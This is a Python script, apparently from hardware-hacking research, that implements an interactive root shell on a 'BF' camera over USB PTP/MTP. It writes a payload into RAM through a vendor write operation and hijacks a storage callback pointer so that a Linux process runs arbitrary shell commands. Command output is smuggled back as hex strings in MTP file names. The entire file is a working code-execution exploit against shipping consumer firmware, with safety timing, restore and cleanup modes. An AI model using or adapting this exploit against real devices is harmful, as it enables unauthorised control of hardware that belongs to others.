#!/usr/bin/env python3
"""Interactive RAM-only shell for the BF camera over vendor PTP.

Verified chain (firmware 1.04, 2026-11-05):
  0x900a write -> RAM at [0x4d7301a00] + offset
  -> the calibration save that follows calls [0x4d729bd00]
  -> payload restores the callback and sends IPC selector 1
  -> Linux usbipcu runs system(command)

Output channel: MTP GetObject fails on files the server did not index (it
hands the fd to a Sigma kernel ioctl, and open() fails), but object *names*
are served.  The command is therefore run as

  ( sleep 3; o=$( { CMD ; } 2>&1 | head -c 100 | od -An -tx1 | tr -d ' \n');
    : > /media/root/SIGMA/bo_${o}.txt ) &

so the output becomes a hex string in the file name, visible through
GetObjectHandles/GetObjectInfo.  The delayed background start keeps Linux-side
SD-card I/O out of the calibration save window.

Safety rules learned the hard way:
  - every 0x900a write runs a 64 KiB calibration save
  - issuing several saves in quick succession can wedge the whole RTOS
    (screen + USB frozen; the camera was power-cycled, though that may
     not have been necessary - a long save stall is the likelier cause)
  - so: one payload write, one trigger, no write retries, and a cooldown
    between commands

Usage:
  bf_shell.py                  interactive
  bf_shell.py -c "uname -a"    one-shot
  bf_shell.py --probe          channel self-test (echo probe-ok)
  bf_shell.py --restore        put the storage callback back
  bf_shell.py --clean          remove leftover bo_*.txt files
"""

import argparse
import os
import struct
import sys
import time

import usb.core
import usb.util

import build_live_payload as blp
import live_stage as ls

OUT_DIR = "/media/root/SIGMA"
PREFIX = "bo_"
COOLDOWN = 10.0          # seconds after a trigger before the next 0x900a
MAX_CMD = 140            # wrapper adds 108 bytes; IPC command limit is 255


def now():
    return time.time()


class Camera:
    def __init__(self):
        self.dev = usb.core.find(idVendor=ls.VID, idProduct=ls.PID)
        if self.dev is None:
            raise SystemExit("device not found")
        cfg = self.dev.get_active_configuration()
        self.intf = cfg[(0, 0)]
        self.out_ep, self.in_ep = ls.endpoints(self.intf)
        usb.util.claim_interface(self.dev, self.intf.bInterfaceNumber)
        for ep in (self.out_ep, self.in_ep):
            try:
                self.dev.clear_halt(ep.bEndpointAddress)
            except usb.core.USBError:
                pass
        self._drain()
        self.dev.write(
            self.out_ep.bEndpointAddress,
            ls.CONTAINER.pack(16, ls.TYPE_COMMAND, ls.CODE_OPEN_SESSION, 0x11)
            + struct.pack("<I", 1), timeout=8000)
        self._drain()
        st, data = ls.ptp_read(self.dev, self.out_ep, self.in_ep, ls.CACHE_SLOT, 8, 0x12)
        self.buf = ls.qword(data)
        if not self.buf:
            raise SystemExit("read buffer not allocated; run one GetAdjustValue first")
        st, data = ls.ptp_read(self.dev, self.out_ep, self.in_ep, ls.CALLBACK_SLOT, 8, 0x13)
        if ls.qword(data) != ls.ORIGINAL_CALLBACK:
            raise SystemExit(
                "storage callback is %s, not %s; run --restore"
                % (hex(ls.qword(data) or 0), hex(ls.ORIGINAL_CALLBACK)))
        self.last_trigger = 0.0
        self.seq = 0

    # -- plumbing ---------------------------------------------------------
    def _drain(self, timeout=200):
        try:
            while True:
                ls.read_container(self.dev, self.in_ep, timeout=timeout)
        except Exception:
            pass

    def close(self):
        try:
            usb.util.release_interface(self.dev, self.intf.bInterfaceNumber)
        except usb.core.USBError:
            pass
        try:
            usb.util.dispose_resources(self.dev)
        except Exception:
            pass

    def health(self, tid=0x14):
        try:
            self.dev.write(self.out_ep.bEndpointAddress,
                           ls.CONTAINER.pack(12, ls.TYPE_COMMAND, 0x1001, tid),
                           timeout=5000)
            for _ in range(4):
                raw = ls.read_container(self.dev, self.in_ep, timeout=5000)
                _, ctype, _, _ = ls.CONTAINER.unpack_from(raw, 0)
                if ctype == ls.TYPE_RESPONSE:
                    return True
            return False
        except Exception:
            return False

    def mtp(self, code, params=(), tid=0x30):
        self.dev.write(
            self.out_ep.bEndpointAddress,
            ls.CONTAINER.pack(12 + 4 * len(params), ls.TYPE_COMMAND, code, tid)
            + b"".join(struct.pack("<I", p & 0xFFFFFFFF) for p in params),
            timeout=8000)
        data = b""
        status = None
        for _ in range(32):
            raw = ls.read_container(self.dev, self.in_ep)
            _, ctype, c, _ = ls.CONTAINER.unpack_from(raw, 0)
            if ctype == ls.TYPE_DATA:
                data += raw[12:]
            if ctype == ls.TYPE_RESPONSE:
                status = c
                break
        return status, data

    def names(self):
        """Return object names across all storages."""
        st, data = self.mtp(0x1004, tid=0x31)
        out = []
        if not data:
            return out
        n = struct.unpack_from("<I", data, 0)[0]
        for s in struct.unpack_from("<%dI" % n, data, 4):
            st, data = self.mtp(0x1007, (s, 0, 0xFFFFFFFF), tid=0x32)
            if not data:
                continue
            n = struct.unpack_from("<I", data, 0)[0]
            for h in struct.unpack_from("<%dI" % n, data, 4):
                st, info = self.mtp(0x1008, (h,), tid=0x33)
                if not info or len(info) < 53:
                    continue
                ln = info[52]
                name = info[53:53 + 2 * ln].decode("utf-16le", "replace").rstrip("\x00")
                out.append(name)
        return out

    # -- trigger ----------------------------------------------------------
    def send_ipc(self, command):
        """One payload write, one trigger, no retries."""
        wait = COOLDOWN - (now() - self.last_trigger)
        if self.last_trigger and wait > 0:
            time.sleep(wait)
        if not self.health():
            raise RuntimeError("device not healthy before command")
        blob = bytes.fromhex(blp.build("ipc", self.buf + ls.PAYLOAD_OFF,
                                       command=command, sender=ls.SENDER)["blob_hex"])
        st = ls.ptp_write(self.dev, self.out_ep, self.in_ep,
                          self.buf + ls.PAYLOAD_OFF, blob, 0x20)
        if st != 0x2001:
            raise RuntimeError("payload write rejected: %s" % hex(st))
        back = None
        for _ in range(10):
            time.sleep(0.3)
            st, back = ls.ptp_read(self.dev, self.out_ep, self.in_ep,
                                   self.buf + ls.PAYLOAD_OFF, len(blob), 0x21)
            if back == blob:
                break
        if back != blob:
            # Deliberately no rewrite: each rewrite is another flash save and
            # several rapid ones are what wedged the camera before.
            raise RuntimeError("payload did not land; not triggering (cooldown, then retry)")
        self.last_trigger = now()
        st = ls.ptp_write(self.dev, self.out_ep, self.in_ep, ls.CALLBACK_SLOT,
                          struct.pack("<Q", self.buf + ls.PAYLOAD_OFF), 0x22)
        if st != 0x2001:
            raise RuntimeError("trigger rejected: %s" % hex(st))
        time.sleep(2.0)
        st, data = ls.ptp_read(self.dev, self.out_ep, self.in_ep, ls.CALLBACK_SLOT, 8, 0x23)
        if ls.qword(data) != ls.ORIGINAL_CALLBACK:
            raise RuntimeError("callback not restored; power-cycle the camera")

    # -- command ----------------------------------------------------------
    def run(self, cmd):
        if len(cmd) > MAX_CMD:
            return {"ok": False, "error": "command too long (%d > %d)" % (len(cmd), MAX_CMD)}
        self.seq += 1
        tag = "%s%s_" % (PREFIX, os.urandom(3).hex())
        wrapped = ("( sleep 10; o=$( { %s ; } 2>&1 | "
                   "hexdump -v -n 100 -e '1/1 \"%%02x\"'); : > %s/%s${o}.txt ) &"
                   % (cmd, OUT_DIR, tag))
        if len(wrapped.encode()) + 9 > 264:
            return {"ok": False, "error": "wrapped command exceeds the IPC buffer"}
        before = set(self.names())
        self.send_ipc(wrapped)
        deadline = now() + 30
        found = None
        while now() < deadline and found is None:
            time.sleep(1.0)
            fresh = [n for n in self.names() if n.startswith(tag)]
            if fresh:
                found = fresh[0]
        if found is None:
            return {"ok": False, "error": "no output object appeared"}
        hexpart = found[len(tag):-4]
        try:
            output = bytes.fromhex(hexpart) if hexpart else b""
        except ValueError:
            return {"ok": False, "error": "undecodable output name", "name": found}
        return {"ok": True, "output": output.decode("utf-8", "replace"), "name": found}

    def clean(self):
        self.send_ipc("rm -f %s/%s*.txt" % (OUT_DIR, PREFIX))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-c", "--command")
    ap.add_argument("--probe", action="store_true")
    ap.add_argument("--restore", action="store_true")
    ap.add_argument("--clean", action="store_true")
    args = ap.parse_args()

    cam = Camera()
    try:
        if args.restore:
            st = ls.ptp_write(cam.dev, cam.out_ep, cam.in_ep, ls.CALLBACK_SLOT,
                              struct.pack("<Q", ls.ORIGINAL_CALLBACK), 0x40)
            st2, data = ls.ptp_read(cam.dev, cam.out_ep, cam.in_ep, ls.CALLBACK_SLOT, 8, 0x41)
            print("callback %s (status %s)" % (hex(ls.qword(data) or 0), hex(st)))
            return 0
        if args.clean:
            cam.clean()
            print("cleanup command sent")
            return 0
        if args.probe:
            res = cam.run("echo probe-ok")
            print(res)
            return 0 if res.get("ok") else 1
        if args.command:
            res = cam.run(args.command)
            if res.get("ok"):
                sys.stdout.write(res["output"])
                if res["output"] and not res["output"].endswith("\n"):
                    sys.stdout.write("\n")
            else:
                print(res)
            return 0 if res.get("ok") else 1

        print("BF RAM shell. Each command costs one calibration save; "
              "about %.0f s apart. 'exit' to quit." % COOLDOWN)
        while True:
            try:
                line = input("bf> ").strip()
            except EOFError:
                break
            if not line:
                continue
            if line in ("exit", "quit"):
                break
            res = cam.run(line)
            if res.get("ok"):
                sys.stdout.write(res["output"])
                if res["output"] and not res["output"].endswith("\n"):
                    sys.stdout.write("\n")
            else:
                print("[!] %s" % res.get("error"))
    finally:
        cam.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
